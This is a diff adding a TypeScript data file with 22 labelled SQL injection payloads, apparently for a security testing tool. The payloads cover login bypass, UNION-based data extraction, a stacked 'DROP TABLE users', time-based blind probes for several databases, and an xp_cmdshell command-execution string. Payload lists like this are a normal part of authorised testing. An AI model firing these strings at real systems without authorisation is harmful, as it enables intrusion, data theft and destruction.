@@ -1,0 +1,26 @@
+import type { PayloadItem } from '../types'
+
+export const SQLI_PAYLOADS: PayloadItem[] = [
+  { id: 'sqli-1', category: 'sqli', featured: true, label: "OR '1'='1", value: "' OR '1'='1" },
+  { id: 'sqli-2', category: 'sqli', featured: true, label: 'OR 1=1--', value: "' OR 1=1--" },
+  { id: 'sqli-3', category: 'sqli', featured: true, label: 'UNION SELECT', value: "' UNION SELECT NULL,NULL,NULL--" },
+  { id: 'sqli-4', category: 'sqli', featured: true, label: 'Stacked DROP', value: "'; DROP TABLE users;--" },
+  { id: 'sqli-5', category: 'sqli', featured: true, label: 'Time blind', value: "1; WAITFOR DELAY '0:0:5'--" },
+  { id: 'sqli-6', category: 'sqli', featured: true, label: 'Boolean blind', value: "1' AND '1'='1" },
+  { id: 'sqli-7', category: 'sqli', featured: true, label: 'OR 1=1#', value: "' OR 1=1#" },
+  { id: 'sqli-8', category: 'sqli', featured: true, label: 'Admin bypass', value: "admin'--" },
+  { id: 'sqli-9', category: 'sqli', label: 'Double quote OR', value: '" OR "1"="1' },
+  { id: 'sqli-10', category: 'sqli', label: 'OR true', value: "' OR true--" },
+  { id: 'sqli-11', category: 'sqli', label: 'SLEEP MySQL', value: "1' AND SLEEP(5)--" },
+  { id: 'sqli-12', category: 'sqli', label: 'pg_sleep', value: "1'; SELECT pg_sleep(5)--" },
+  { id: 'sqli-13', category: 'sqli', label: 'UNION version', value: "' UNION SELECT @@version--" },
+  { id: 'sqli-14', category: 'sqli', label: 'HAVING 1=1', value: "' HAVING 1=1--" },
+  { id: 'sqli-15', category: 'sqli', label: 'ORDER BY 10', value: "' ORDER BY 10--" },
+  { id: 'sqli-16', category: 'sqli', label: 'Benchmark', value: "1' AND BENCHMARK(5000000,SHA1('a'))--" },
+  { id: 'sqli-17', category: 'sqli', label: 'Hex encoded', value: '0x27204f52202731273d2731' },
+  { id: 'sqli-18', category: 'sqli', label: 'Comment mix', value: "'/**/OR/**/1=1--" },
+  { id: 'sqli-19', category: 'sqli', label: 'LIKE wildcard', value: "' OR username LIKE '%" },
+  { id: 'sqli-20', category: 'sqli', label: 'xp_cmdshell', value: "'; EXEC xp_cmdshell('dir')--" },
+  { id: 'sqli-21', category: 'sqli', featured: true, label: 'SQLite sleep', value: "1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--" },
+  { id: 'sqli-22', category: 'sqli', featured: true, label: 'OR 1=1 /*', value: "' OR 1=1 /*" },
+]
